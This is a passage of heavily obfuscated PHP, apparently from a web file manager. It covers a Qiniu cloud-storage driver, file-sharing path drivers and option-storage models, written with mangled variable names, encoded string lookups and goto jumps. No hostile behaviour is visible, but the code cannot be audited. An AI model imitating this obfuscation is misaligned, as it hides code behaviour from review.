$…ù’°ıÂ = array(); foreach ($ñÃﬁ¶ì[$Ÿö∆¥˝ª[76]] as $êÖ•Ò‰ï) { $…ù’°ıÂ[$êÖ•Ò‰ï[$Ÿö∆¥˝ª[95]]] = $êÖ•Ò‰ï[$Ÿö∆¥˝ª[80]]; } foreach ($ñÃﬁ¶ì[$Ÿö∆¥˝ª[77]] as $êÖ•Ò‰ï) { if (is_string($êÖ•Ò‰ï)) { $…ù’°ıÂ[$êÖ•Ò‰ï] = 0; } } return $this->listAllFiles($¢´î«Ó§, array_keys($…ù’°ıÂ), $…ù’°ıÂ); } private function fileList($Á≥Çﬁ¯æ, $¥»ªôö¨ = '', $Ó¢‰≠°¯ = 0) { $ñÒ¡Ú¸â =& $_SERVER[Çâä∆◊¡]; $Á≥Çﬁ¯æ = trim($Á≥Çﬁ¯æ, $ñÒ¡Ú¸â[8]); $Éÿ›†¶Ω = empty($Á≥Çﬁ¯æ) && $Á≥Çﬁ¯æ !== $ñÒ¡Ú¸â[190] ? $ñÒ¡Ú¸â[12] : $Á≥Çﬁ¯æ . $ñÒ¡Ú¸â[8]; $ÖÛÿµÇ = $ñÒ¡Ú¸â[12]; $ùîÊÃ¡‹ = 1000; $êˆ’’ÂΩ = $this->listItemCache === !1 ? !1 : !0; $Û‡˙æÆï = $´‘ô–¥‘ = array(); while (!0) { check_abort(); list($–Œ±ç∂∆, $àÏÕñêª) = $this->bucketManager->listFiles($this->bucket, $Éÿ›†¶Ω, $ÖÛÿµÇ, $ùîÊÃ¡‹, $¥»ªôö¨); if ($àÏÕñêª) { break; } $ÖÛÿµÇ = array_key_exists($ñÒ¡Ú¸â[1381], $–Œ±ç∂∆) ? $ÖÛÿµÇ = $–Œ±ç∂∆[$ñÒ¡Ú¸â[1414]] : $ñÒ¡Ú¸â[12]; $Ôﬁ∂Ú®… = isset($–Œ±ç∂∆[$ñÒ¡Ú¸â[1415]]) ? $–Œ±ç∂∆[$ñÒ¡Ú¸â[1415]] : array(); $…˛÷ÊÍé = isset($–Œ±ç∂∆[$ñÒ¡Ú¸â[1416]]) ? $–Œ±ç∂∆[$ñÒ¡Ú¸â[1416]] : array(); foreach ($Ôﬁ∂Ú®… as $ãˆä∂õ) { if ($ãˆä∂õ[$ñÒ¡Ú¸â[95]] == $Éÿ›†¶Ω) { continue; } $—ËÎ√ª’ = $ãˆä∂õ[$ñÒ¡Ú¸â[95]]; $ñ÷È˛œŸ = $ãˆä∂õ[$ñÒ¡Ú¸â[1412]]; $ãˆä∂õ[$ñÒ¡Ú¸â[80]] = $ñ÷È˛œŸ; $ÖúíïÎ = $ñ÷È˛œŸ == 0 && substr($—ËÎ√ª’, strlen($—ËÎ√ª’) - 1, 1) == $ñÒ¡Ú¸â[8] ? !0 : !1; if ($êˆ’’ÂΩ) { $this->cacheMethod($ñÒ¡Ú¸â[198], $—ËÎ√ª’, $ÖúíïÎ); $this->cacheMethod($ñÒ¡Ú¸â[199], $—ËÎ√ª’, $ãˆä∂õ); } if ($ÖúíïÎ) { $Û‡˙æÆï[] = $—ËÎ√ª’; continue; } $´‘ô–¥‘[] = $Ó¢‰≠°¯ ? $ãˆä∂õ : $—ËÎ√ª’; } foreach ($…˛÷ÊÍé as $—ËÎ√ª’) { if ($—ËÎ√ª’ == $Éÿ›†¶Ω) { continue; } $Û‡˙æÆï[] = $—ËÎ√ª’; if ($êˆ’’ÂΩ) { $this->cacheMethod($ñÒ¡Ú¸â[198], $—ËÎ√ª’, !0); } } if ($ÖÛÿµÇ === $ñÒ¡Ú¸â[12]) { break; } } if ($êˆ’’ÂΩ) { $this->cacheMethod($ñÒ¡Ú¸â[198], $Á≥Çﬁ¯æ, !0); } return array($ñÒ¡Ú¸â[77] => $Û‡˙æÆï, $ñÒ¡Ú¸â[76] => $´‘ô–¥‘); } public function canRead($åºáìõ™) { return $this->exist($åºáìõ™) ? !0 : !1; } public function canWrite($æ≤¡≠Ä°) { return $this->exist($æ≤¡≠Ä°) ? !0 : !1; } public function getContent($ÌÑÆáìﬂ) { return $this->fileSubstr($ÌÑÆáìﬂ, 0, -1); } public function setContent($ØØö ó≈, $ùΩ¬˛È  = '') { $ü™Ñ›†É = $this->tempFile($this->pathThis($ØØö ó≈)); file_put_contents($ü™Ñ›†É, $ùΩ¬˛È ); if ($this->upload($ØØö ó≈, $ü™Ñ›†É)) { $this->tempFileRemve($ü™Ñ›†É); return !0; } return !1; } public function refreshUrls($†ßéå∑É) { $ö◊•˚¨£ =& $_SERVER[Çâä∆◊¡]; $÷ü¸∏¶´ = array(); if (is_array($†ßéå∑É)) { foreach ($†ßéå∑É as $éüÜ´ó¥) { $÷ü¸∏¶´[] = $this->link($éüÜ´ó¥); } } else { $÷ü¸∏¶´[] = $this->link($†ßéå∑É); } $ûÄ¬Ÿ˜Ò = new Qiniu\Cdn\CdnManager($this->auth); list($∆ÈΩÈıí, $»î¡»ﬂ¡) = $ûÄ¬Ÿ˜Ò->refreshUrls($÷ü¸∏¶´); if ($»î¡»ﬂ¡) { return !1; } return $∆ÈΩÈıí[$ö◊•˚¨£[1168]] == $ö◊•˚¨£[753] ? !0 : !1; } public function fileSubstr($’¡çíô”, $∂Æ˛–ú¿, $ôúÿ‹•∞) { $≥ü˜£Ë’ =& $_SERVER[Çâä∆◊¡]; if (!($ÑÁ€ôÕŒ = $this->link($’¡çíô”))) { return !1; } $ùí‰Ó†é = !1; if ($ôúÿ‹•∞ > 0) { $âäŒ¡Ω≤ = $∂Æ˛–ú¿ + $ôúÿ‹•∞ - 1; $ùí‰Ó†é = array($≥ü˜£Ë’[1417] . $∂Æ˛–ú¿ . $≥ü˜£Ë’[460] . $âäŒ¡Ω≤); } $Ñ’¨◊âê = url_request($ÑÁ€ôÕŒ, $≥ü˜£Ë’[225], !1, $ùí‰Ó†é); return $Ñ’¨◊âê[$≥ü˜£Ë’[743]] ? $Ñ’¨◊âê[$≥ü˜£Ë’[1178]] : !1; } public function upload($≥Ò¯„˛Î, $¿Ø£òó£, $ŒßÜ©Ëô = false, $∑¬áŒº∑ = REPEAT_REPLACE) { $ãìõ„‹√ = new Qiniu\Storage\UploadManager(); $ùÈ˚«öü = $this->auth->uploadToken($this->bucket, $≥Ò¯„˛Î); $¶¨Üı∞ = get_file_mime(get_path_ext($¿Ø£òó£)); list($ƒÁø«ÏÖ, $Îò–ñîÜ) = $ãìõ„‹√->putFile($ùÈ˚«öü, $≥Ò¯„˛Î, $¿Ø£òó£, null, $¶¨Üı∞); return $Îò–ñîÜ ? !1 : $this->getPathOuter($≥Ò¯„˛Î); } public function uploadFormData($ÙçË‰ãÎ, $≥àºÕ‚Ì = 3600) { return $this->uploadToken($ÙçË‰ãÎ, $≥àºÕ‚Ì); } public function multiUploadFormData($ıÏ◊è¶›, $ı¯à⁄ø± = 3600) { return $this->uploadToken($ıÏ◊è¶›, $ı¯à⁄ø±); } private function uploadToken($ä˛œîø, $ﬂ≤˜ÿÄ» = 3600) { $‡˝≤˝√Ô =& $_SERVER[Çâä∆◊¡]; $Ï∏¬’ë§ = $ﬂ≤˜ÿÄ»; $åßÖ»≤¡ = array($‡˝≤˝√Ô[1418] => $‡˝≤˝√Ô[1419]); $Ë•ñ°…å = $ä˛œîø; $Ùç∫Ò∂˝ = $this->auth->uploadToken($this->bucket, $Ë•ñ°…å, $Ï∏¬’ë§, $åßÖ»≤¡, !0); $øà¶•ß˛ = empty($this->region) || $this->region == $‡˝≤˝√Ô[1420] ? $‡˝≤˝√Ô[12] : $‡˝≤˝√Ô[460] . $this->region; $Ö˘Ûˆˆ‹ = http_type() . "\x3a\57\x2f\165\160\x6c\157\x61\x64{$øà¶•ß˛}\56\161\x69\156\x69\x75\x70\x2e\143\157\x6d\x2f"; return array($‡˝≤˝√Ô[1421] => $Ùç∫Ò∂˝, $‡˝≤˝√Ô[1422] => $Ö˘Ûˆˆ‹); } public function download($˚¸∫ì˜, $˚‡”ÍΩ®) { $‡ÈéÚ°Ã = IO::getPathInner(IO::mkfile($˚‡”ÍΩ®)); if (!($ŒÓ‚™”÷ = $this->link($˚¸∫ì˜))) { return !1; } $ŒïÊ‰…π = 0; $µç“«Ûä = 1024 * 200; $›ÚÅ£ﬂ§ = fopen($‡ÈéÚ°Ã, $_SERVER[Çâä∆◊¡][1423]); while (!0) { $°Â´Â À = $this->fileSubstr($˚¸∫ì˜, $ŒïÊ‰…π, $µç“«Ûä); if ($°Â´Â À === !1) { return !1; } fwrite($›ÚÅ£ﬂ§, $°Â´Â À); $ŒïÊ‰…π += $µç“«Ûä; if (strlen($°Â´Â À) < $µç“«Ûä) { break; } } fclose($›ÚÅ£ﬂ§); return $˚‡”ÍΩ®; } public function link($©∏‹◊ßü, $∏”å©è˚ = '') { if (!$this->isFile($©∏‹◊ßü)) { return !1; } $„æàã¶Œ = $this->getHost() . $_SERVER[Çâä∆◊¡][8] . $this->pathEncode($©∏‹◊ßü) . $∏”å©è˚; return $this->auth->privateDownloadUrl($„æàã¶Œ, 3600 * 12); } public function fileOut($⁄óí∏¢¢, $∂ﬂËÂ˙¢ = false, $ƒ∆›≠≤≠ = false, $øä‘“§Î = '') { $ƒüÌÏú¶ =& $_SERVER[Çâä∆◊¡]; if ($this->isFileOutServer()) { return $this->fileOutServer($⁄óí∏¢¢, $∂ﬂËÂ˙¢, $ƒ∆›≠≤≠, $øä‘“§Î); } if (!$ƒ∆›≠≤≠) { $ƒ∆›≠≤≠ = $this->pathThis($⁄óí∏¢¢); } $≈õƒ¥Œì = $∂ﬂËÂ˙¢ ? $ƒüÌÏú¶[1424] . rawurlencode($ƒ∆›≠≤≠) : $ƒüÌÏú¶[12]; $µœ ﬁ≤ì = $this->link($⁄óí∏¢¢, $≈õƒ¥Œì); $this->fileOutLink($µœ ﬁ≤ì); } public function fileOutServer($¿á√Ñ⁄ , $Ë˙—∫ñÌ = false, $úÓ‰Ù˝∞ = false, $—Í≠’Öº = '') { parent::fileOut($¿á√Ñ⁄ , $Ë˙—∫ñÌ, $úÓ‰Ù˝∞, $—Í≠’Öº); } public function fileOutImage($ûñ˘¯Û⁄, $»ñ¡¬Òë = 250) { $√Ê»µòƒ = $this->link($ûñ˘¯Û⁄, $_SERVER[Çâä∆◊¡][1425] . $»ñ¡¬Òë); $this->fileOutLink($√Ê»µòƒ); } public function fileOutImageServer($ï∂Ωê«ƒ, $Ó¢çÖ¥â = 250) { parent::fileOutImage($ï∂Ωê«ƒ, $Ó¢çÖ¥â); } public function hashMd5($íï∆ñö) { $ÒÈ°–Ö÷ =& $_SERVER[Çâä∆◊¡]; $ÉËÛƒ‹ñ = $this->objectMeta($íï∆ñö); return isset($ÉËÛƒ‹ñ[$ÒÈ°–Ö÷[207]]) ? $ÉËÛƒ‹ñ[$ÒÈ°–Ö÷[207]] : !1; $ÀÂ‘‘£– = $this->link($íï∆ñö, $ÒÈ°–Ö÷[1426]); } public function size($ÓïíÊΩ˝) { $â ∫≤÷ = $this->objectMeta($ÓïíÊΩ˝); return $â ∫≤÷ ? $â ∫≤÷[$_SERVER[Çâä∆◊¡][80]] : 0; } public function info($î´éïÑª) { if ($this->isFolder($î´éïÑª)) { return $this->folderInfo($î´éïÑª); } else { if ($this->isFile($î´éïÑª)) { return $this->fileInfo($î´éïÑª); } } return !1; } public function exist($Œ≤Ô∞¬ò) { return $this->isFile($Œ≤Ô∞¬ò) || $this->isFolder($Œ≤Ô∞¬ò); } public function isFile($¨Ö èøÂ) { return !$this->isFolder($¨Ö èøÂ) && $this->objectMeta($¨Ö èøÂ); } public function isFolder($ÅÚÆÏÄ„) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][198], $ÅÚÆÏÄ„); } protected function objectMeta($””´≤ºÜ) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][199], $””´≤ºÜ); } protected function _objectMeta($‰™ËóÙä) { $ª¡»π∫è =& $_SERVER[Çâä∆◊¡]; list($¨öÏï›÷, $–≠íéèÊ) = $this->bucketManager->stat($this->bucket, $‰™ËóÙä); if ($¨öÏï›÷) { $¨öÏï›÷[$ª¡»π∫è[80]] = intval($¨öÏï›÷[$ª¡»π∫è[1412]]); } return $¨öÏï›÷; } protected function _isFolder($©√·¥ºÉ) { $∫‹˘íó≈ =& $_SERVER[Çâä∆◊¡]; if ($©√·¥ºÉ == $∫‹˘íó≈[12] || $©√·¥ºÉ == $∫‹˘íó≈[8]) { return !0; } list($ˆéœèÉü, $ìˆéó˘) = $this->bucketManager->listFiles($this->bucket, trim($©√·¥ºÉ, $∫‹˘íó≈[8]) . $∫‹˘íó≈[8], $∫‹˘íó≈[12], 1, $∫‹˘íó≈[8]); return !empty($ˆéœèÉü[$∫‹˘íó≈[1415]]) || !empty($ˆéœèÉü[$∫‹˘íó≈[1416]]) ? !0 : !1; } } goto dÙê˜´≤úç; Cπì¨áÀ‡„: class PathDriverDriverShareItem { public function __construct($ö®¨ªô) { $this->pathParse = $ö®¨ªô; } public function __call($êå†ﬁ≥«, $ÊÈ‰ÜÇ√) { $˚Ú∫Í¨∑ =& $_SERVER[Çâä∆◊¡]; if (method_exists($this, $êå†ﬁ≥«)) { return; } $ÃæàÃ§§ = call_user_func_array(array($˚Ú∫Í¨∑[1322], $êå†ﬁ≥«), $ÊÈ‰ÜÇ√); $®á™˘üï = array($˚Ú∫Í¨∑[1323], $˚Ú∫Í¨∑[1324], $˚Ú∫Í¨∑[1325], $˚Ú∫Í¨∑[1326], $˚Ú∫Í¨∑[549], $˚Ú∫Í¨∑[551], $˚Ú∫Í¨∑[1327], $˚Ú∫Í¨∑[108], $˚Ú∫Í¨∑[1328], $˚Ú∫Í¨∑[1329]); if (in_array($êå†ﬁ≥«, $®á™˘üï)) { $ÃæàÃ§§ = $this->getPathOuter($ÃæàÃ§§); } return $ÃæàÃ§§; } public function copy($á˛ıÌÕ¶, $“ëåÌù», $ò≥•óçı = false, $ÜÀã»îÙ = false) { return $this->copyMove($á˛ıÌÕ¶, $“ëåÌù», $ò≥•óçı, $_SERVER[Çâä∆◊¡][549], $ÜÀã»îÙ); } public function move($ÊÈˆ¬ÛÙ, $§‡≤è¢€, $˘¨ö∫ôÙ = false, $π™Ñ≈Úƒ = false) { return $this->copyMove($ÊÈˆ¬ÛÙ, $§‡≤è¢€, $˘¨ö∫ôÙ, $_SERVER[Çâä∆◊¡][551], $π™Ñ≈Úƒ); } private function copyMove($Í ®ìè˙, $£ƒï®·⁄, $ŸÔÿ¿å¥, $–”¥¿æÀ, $â¬Ÿ∏óÕ = false) { $≠“†Ãê÷ =& $_SERVER[Çâä∆◊¡]; $∞€Ó˘Ö˜ = $£ƒï®·⁄; $°¶∫≈˙ô = IO::driverMake($£ƒï®·⁄); if ($°¶∫≈˙ô->pathParse[$≠“†Ãê÷[1138]]) { $£ƒï®·⁄ = $°¶∫≈˙ô->pathParse[$≠“†Ãê÷[1138]]; } else { $£ƒï®·⁄ = $∞€Ó˘Ö˜; } $¨ıá¿®Ã = IO::copyMove($Í ®ìè˙, $£ƒï®·⁄, $ŸÔÿ¿å¥, $–”¥¿æÀ, $â¬Ÿ∏óÕ); $¨ıá¿®Ã = $this->getPathOuter($¨ıá¿®Ã); return $¨ıá¿®Ã; } public function pathThis($ò„ƒÒèô) { return get_path_this($this->pathParse[$_SERVER[Çâä∆◊¡][78]]); } public function pathFather($√ûÖ∫Á£) { return get_path_father($this->pathParse[$_SERVER[Çâä∆◊¡][78]]); } public function iconvSystem($¢ƒ¶Íî†) { return $¢ƒ¶Íî†; } protected function infoParse($¯ö¥…Åë, $°æ˝ò˘ = false) { $Í–¨ÁÓã =& $_SERVER[Çâä∆◊¡]; $˚ºôîÓÊ = $this->pathParse[$Í–¨ÁÓã[486]][$Í–¨ÁÓã[1161]] . $this->pathParse[$Í–¨ÁÓã[1154]]; if ($°æ˝ò˘) { $Ñ∂Î¢Ωó = IO::infoWithChildren($˚ºôîÓÊ); } else { $Ñ∂Î¢Ωó = IO::info($˚ºôîÓÊ); } $ë⁄à·√Œ = $this->pathParse[$Í–¨ÁÓã[486]]; return Action($Í–¨ÁÓã[1320])->_shareItemeParse($Ñ∂Î¢Ωó, $ë⁄à·√Œ); } public function listAll($ä˙åÿéµ) { $‘≠Ë«–› =& $_SERVER[Çâä∆◊¡]; $øª≈”°ò = IO::listAll($ä˙åÿéµ); $‡»Ñ¥¸Ø = $this->pathParse[$‘≠Ë«–›[486]]; foreach ($øª≈”°ò as &$ä‘Ùˆòë) { check_abort(); $Ê¡üéÇ— = IO::info($ä‘Ùˆòë[$‘≠Ë«–›[78]]); $Ê¡üéÇ— = is_array($Ê¡üéÇ—) ? $Ê¡üéÇ— : array(); $ä‘Ùˆòë = array_merge($Ê¡üéÇ—, $ä‘Ùˆòë); $ä‘Ùˆòë[$‘≠Ë«–›[87]] = Action($‘≠Ë«–›[1320])->_shareItemeParse($ä‘Ùˆòë, $‡»Ñ¥¸Ø); } unset($ä‘Ùˆòë); return $øª≈”°ò; } public function getPathOuter($Ô¯¬¿∑É) { $„ö¥⁄œô =& $_SERVER[Çâä∆◊¡]; $Æ˜∫§ıÜ = KodIO::parse($Ô¯¬¿∑É); if ($Æ˜∫§ıÜ[$„ö¥⁄œô[33]] == KodIO::KOD_SHARE_ITEM) { return $Æ˜∫§ıÜ[$„ö¥⁄œô[78]]; } $¿˘ú∏¯‚ = KodIO::clear($Ô¯¬¿∑É); $Ô∂≤àÄ = KodIO::clear($this->pathParse[$„ö¥⁄œô[486]][$„ö¥⁄œô[1161]]); $¥ü∆òÙ° = substr($¿˘ú∏¯‚, strlen($Ô∂≤àÄ)); if (substr($¿˘ú∏¯‚, 0, strlen($Ô∂≤àÄ)) != $Ô∂≤àÄ) { return !1; } return $this->pathParse[$„ö¥⁄œô[1155]] . $„ö¥⁄œô[8] . ltrim($¥ü∆òÙ°, $„ö¥⁄œô[8]); } public function getType() { $õ“⁄…›Á =& $_SERVER[Çâä∆◊¡]; $ùêƒöÌã = str_replace($õ“⁄…›Á[74], $õ“⁄…›Á[12], get_class($this)); return strtolower($ùêƒöÌã); } public function isTypeObject($Í†π¬îØ) { return IO::isTypeObject($Í†π¬îØ); } public function info($„Ó¸†è≈) { return $this->infoParse($„Ó¸†è≈); } public function infoAuth($ÜÔÁÚ±È) { return $this->infoParse($ÜÔÁÚ±È); } public function infoWithChildren($Ωêº÷Ùæ) { return $this->infoParse($Ωêº÷Ùæ, !0); } public function infoFull($Ë√¢≤Âñ) { return $this->infoParse($Ë√¢≤Âñ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($À÷üçÏ) { $this->pathParse = $À÷üçÏ; } protected function infoParse($˙⁄©ïù÷, $í“Ñˆëı = false) { $Ë≤˙—”ç =& $_SERVER[Çâä∆◊¡]; return Action($Ë≤˙—”ç[1160])->sharePathInfo($this->pathParse[$Ë≤˙—”ç[78]], !0, $í“Ñˆëı); } public function listPath($’çÌŸ∏¿, $ÿÉ‰çË√ = false) { $ø∑˚¢∞’ =& $_SERVER[Çâä∆◊¡]; $™€™ˆøî = IO::listPath($’çÌŸ∏¿, $ÿÉ‰çË√); if (!$™€™ˆøî) { return $™€™ˆøî; } if (is_array($™€™ˆøî[$ø∑˚¢∞’[1321]])) { $øá≤ŸΩ‘ = Action($ø∑˚¢∞’[1330])->parsePathChildren($™€™ˆøî[$ø∑˚¢∞’[1321]], array($ø∑˚¢∞’[422] => $’çÌŸ∏¿)); $™€™ˆøî[$ø∑˚¢∞’[1321]] = Action($ø∑˚¢∞’[1160])->shareItemInfo($øá≤ŸΩ‘); } foreach ($™€™ˆøî as $Ö“Áπ∆€ => $îÀ¢’¥À) { if (!in_array($Ö“Áπ∆€, array($ø∑˚¢∞’[76], $ø∑˚¢∞’[77]))) { continue; } foreach ($îÀ¢’¥À as $üëíæ£Ñ => $øá≤ŸΩ‘) { $øá≤ŸΩ‘ = Action($ø∑˚¢∞’[1330])->parsePathChildren($øá≤ŸΩ‘, array($ø∑˚¢∞’[422] => $’çÌŸ∏¿)); $™€™ˆøî[$Ö“Áπ∆€][$üëíæ£Ñ] = Action($ø∑˚¢∞’[1160])->shareItemInfo($øá≤ŸΩ‘); } } return $™€™ˆøî; } public function listAll($Ê≤ﬁ∑ãÂ) { $Ø·≠–‰≈ =& $_SERVER[Çâä∆◊¡]; $ÀÕìê¨Ÿ = IO::listAll($Ê≤ﬁ∑ãÂ); foreach ($ÀÕìê¨Ÿ as &$ÉÒ¥∑ß˚) { $√‹Ó›ñÜ = IO::info($ÉÒ¥∑ß˚[$Ø·≠–‰≈[78]]); $√‹Ó›ñÜ = is_array($√‹Ó›ñÜ) ? $√‹Ó›ñÜ : array(); $ÉÒ¥∑ß˚ = array_merge($√‹Ó›ñÜ, $ÉÒ¥∑ß˚); $ÉÒ¥∑ß˚[$Ø·≠–‰≈[87]] = Action($Ø·≠–‰≈[1160])->shareItemInfo($ÉÒ¥∑ß˚); } unset($ÉÒ¥∑ß˚); return $ÀÕìê¨Ÿ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($£µ‡€÷¯) { parent::__construct($£µ‡€÷¯); } } goto bÜ»Ÿ≤ééû; BîËÏÒá‡€: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\117\160\x74\151\x6f\156"; public $field = array(); public function listData($Æ†€…‘≥ = false, $÷ıøØ“  = "\x6d\x6f\x64\x69\x66\171\x54\151\x6d\145", $Ï≈Èá‹¿ = false) { $àôÓÎù¸ = Model($this->modelType)->get(!1, $this->optionType, !0); $—é·Àü· = array_values($àôÓÎù¸); if ($—é·Àü· && $—é·Àü·[0] && !is_array($—é·Àü·[0])) { Model($this->modelType)->cacheRemove($this->optionType); $àôÓÎù¸ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$àôÓÎù¸) { return $Æ†€…‘≥ ? null : array(); } if (!$Æ†€…‘≥) { $àôÓÎù¸ = array_filter(array_values($àôÓÎù¸)); return array_sort_by($àôÓÎù¸, $÷ıøØ“ , $Ï≈Èá‹¿); } return $àôÓÎù¸[$_SERVER[Çâä∆◊¡][398] . $Æ†€…‘≥]; } public function insert($†ÎœÜú§) { $¯˘Ñ≤Áé =& $_SERVER[Çâä∆◊¡]; $†ÎœÜú§ = array_field_key($†ÎœÜú§, $this->field); $Áıµ⁄∏ò = Model($this->modelType)->get($¯˘Ñ≤Áé[399], $this->optionType . $¯˘Ñ≤Áé[400]); $Áıµ⁄∏ò = $Áıµ⁄∏ò ? $Áıµ⁄∏ò : 0; $†ÎœÜú§[$¯˘Ñ≤Áé[401]] = ++$Áıµ⁄∏ò; $†ÎœÜú§[$¯˘Ñ≤Áé[193]] = time(); $†ÎœÜú§[$¯˘Ñ≤Áé[86]] = time(); Model($this->modelType)->set($¯˘Ñ≤Áé[399], $Áıµ⁄∏ò, $this->optionType . $¯˘Ñ≤Áé[400]); Model($this->modelType)->set($¯˘Ñ≤Áé[398] . $Áıµ⁄∏ò, $†ÎœÜú§, $this->optionType); return $Áıµ⁄∏ò; } public function update($ô©˝èß…, $¡ƒ˜Å∞π) { $ûÊØıù‹ =& $_SERVER[Çâä∆◊¡]; $¡ƒ˜Å∞π = array_field_key($¡ƒ˜Å∞π, $this->field); $Ω¬∏Åñ∑ = $this->listData($ô©˝èß…); if (!$Ω¬∏Åñ∑ || !$ô©˝èß…) { return !1; } $¡ƒ˜Å∞π = array_merge($Ω¬∏Åñ∑, $¡ƒ˜Å∞π); $¡ƒ˜Å∞π[$ûÊØıù‹[86]] = time(); return Model($this->modelType)->set($ûÊØıù‹[398] . $ô©˝èß…, $¡ƒ˜Å∞π, $this->optionType); } public function remove($™é¿ÄÈ–) { if (!$™é¿ÄÈ–) { return !1; } return Model($this->modelType)->remove($_SERVER[Çâä∆◊¡][398] . $™é¿ÄÈ–, $this->optionType); } public function clear() { $ÿùªÇÍ· =& $_SERVER[Çâä∆◊¡]; Model($this->modelType)->remove($ÿùªÇÍ·[399], $this->optionType . $ÿùªÇÍ·[400]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ñÙ˚√≈À, $úâÎƒá◊) { if (!$úâÎƒá◊) { return !1; } $˙º’¨´  = $this->listData(); $˙º’¨´  = array_to_keyvalue($˙º’¨´ , $ñÙ˚√≈À); return isset($˙º’¨´ [$úâÎƒá◊]) ? $˙º’¨´ [$úâÎƒá◊] : !1; } public function findByName($“úÿ™Õç) { return $this->findByKey($_SERVER[Çâä∆◊¡][32], $“úÿ™Õç); } protected function resetData($¨ﬂûÁ‡¢) { $∞ÁÈöÑ´ =& $_SERVER[Çâä∆◊¡]; $¨ﬂûÁ‡¢ = is_array($¨ﬂûÁ‡¢) ? $¨ﬂûÁ‡¢ : array(); $ËÚ≠∏âÆ = array(); for ($À°Ω†°° = 0; $À°Ω†°° < count($¨ﬂûÁ‡¢); $À°Ω†°°++) { $ËÚ≠∏âÆ[$∞ÁÈöÑ´[398] . $¨ﬂûÁ‡¢[$À°Ω†°°][$∞ÁÈöÑ´[401]]] = $¨ﬂûÁ‡¢[$À°Ω†°°]; } return Model($this->modelType)->set($ËÚ≠∏âÆ, !1, $this->optionType); } private function getAutoName($Óµ®œÿƒ) { $áËÌäµº = array_to_keyvalue($this->listData(), $_SERVER[Çâä∆◊¡][32]); if (!$áËÌäµº || !isset($áËÌäµº[$Óµ®œÿƒ])) { return $Óµ®œÿƒ; } for ($™∑∏”ïÔ = 1; $™∑∏”ïÔ < count($áËÌäµº); $™∑∏”ïÔ++) { $Ö¸ó˘€Ï = $Óµ®œÿƒ . "\x28{$™∑∏”ïÔ}\51"; if (!isset($áËÌäµº[$Ö¸ó˘€Ï])) { return $Ö¸ó˘€Ï; } } return $Ö¸ó˘€Ï; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ä¯”Ÿ•ë = false, $í√»Åëµ = '', $ë±ÏŒ§é = false) { $˘‰ôÔèµ =& $_SERVER[Çâä∆◊¡]; $‡ñ•“»› = $this->cacheGet($í√»Åëµ); $Õæ¡·ÜΩ = $this->optionDefault($í√»Åëµ); $Õæ¡·ÜΩ = is_array($Õæ¡·ÜΩ) ? $Õæ¡·ÜΩ : array(); if (is_array($‡ñ•“»›)) { $‡ñ•“»› = array_merge($Õæ¡·ÜΩ, $‡ñ•“»›); return $Ä¯”Ÿ•ë ? isset($‡ñ•“»›[$Ä¯”Ÿ•ë]) ? $‡ñ•“»›[$Ä¯”Ÿ•ë] : null : $‡ñ•“»›; } $ÙóÌûÍ  = $this->filterWhere(array($˘‰ôÔèµ[33] => $í√»Åëµ)); $‡ñ•“»› = $this->where($ÙóÌûÍ )->select(); $‡ñ•“»› = array_to_keyvalue($‡ñ•“»›, $˘‰ôÔèµ[95], $˘‰ôÔèµ[369]); foreach ($‡ñ•“»› as $¶•™ìíÅ => $æ®„ÆÏÅ) { if ($ë±ÏŒ§é || in_array($¶•™ìíÅ, $this->jsonField)) { $‡ñ•“»›[$¶•™ìíÅ] = json_decode($æ®„ÆÏÅ, !0); } } $this->cacheSet($í√»Åëµ, $‡ñ•“»›); $‡ñ•“»› = array_merge($Õæ¡·ÜΩ, $‡ñ•“»›); return $Ä¯”Ÿ•ë ? $‡ñ•“»›[$Ä¯”Ÿ•ë] : $‡ñ•“»›; } public function set($∫ßÀ∞™∂, $Õﬂ…¨â˛ = false, $≤Üàòâ÷ = '') { $èâÃ≠”• =& $_SERVER[Çâä∆◊¡]; $this->cacheRemove($≤Üàòâ÷); $ÏÀ÷∏Œû = array(); $•≥ÃÜ‡Ã = is_array($∫ßÀ∞™∂) ? $∫ßÀ∞™∂ : array($∫ßÀ∞™∂ => $Õﬂ…¨â˛); foreach ($•≥ÃÜ‡Ã as $÷¢‡òœ¯ => $Æú≥≥π) { if (is_array($Æú≥≥π)) { $Æú≥≥π = json_encode_force($Æú≥≥π); } $this->checkLength($Æú≥≥π, !1, $this->tableName . $èâÃ≠”•[4] . $∫ßÀ∞™∂); $Æú≥≥π = self::textEncode($Æú≥≥π); $•≥ÃÜ‡Ã = array($èâÃ≠”•[33] => $≤Üàòâ÷, $èâÃ≠”•[95] => $÷¢‡òœ¯, $èâÃ≠”•[369] => $Æú≥≥π); $ÏÀ÷∏Œû[] = $this->filterWhere($•≥ÃÜ‡Ã); } if (!$ÏÀ÷∏Œû) { return !0; } return $this->addAll($ÏÀ÷∏Œû, array(), !0); } protected function optionDefault($â£≈¶˝¨ = '') { return !1; } public function setDeep($ú Æ–ø‹, $¨⁄õÒﬂ = false, $Ø”⁄˝Í» = '') { $Í–£∂ô— = explode($_SERVER[Çâä∆◊¡][10], $ú Æ–ø‹); $…ï≈≠ ê = $this->get(); array_set_value($…ï≈≠ ê, $ú Æ–ø‹, $¨⁄õÒﬂ); $this->set($Í–£∂ô—[0], $…ï≈≠ ê[$Í–£∂ô—[0]], $Ø”⁄˝Í»); } public function remove($ÔƒÚâÂΩ, $©ä§ó€Í = '') { $≥¿ÑÑ˘Ó =& $_SERVER[Çâä∆◊¡]; $this->cacheRemove($©ä§ó€Í); $ó≠ŸøËù = $this->filterWhere(array($≥¿ÑÑ˘Ó[95] => $ÔƒÚâÂΩ, $≥¿ÑÑ˘Ó[33] => $©ä§ó€Í)); if (is_null($ÔƒÚâÂΩ)) { unset($ó≠ŸøËù[$≥¿ÑÑ˘Ó[95]]); } return $this->where($ó≠ŸøËù)->delete(); } public function cacheSet($…¡êÏ≥Ù, $ô˛¢†¶ß = false) { return Cache::set($this->cacheKey($…¡êÏ≥Ù), $ô˛¢†¶ß); } public function cacheGet($±†€Û‘Ÿ) { return Cache::get($this->cacheKey($±†€Û‘Ÿ)); } public function 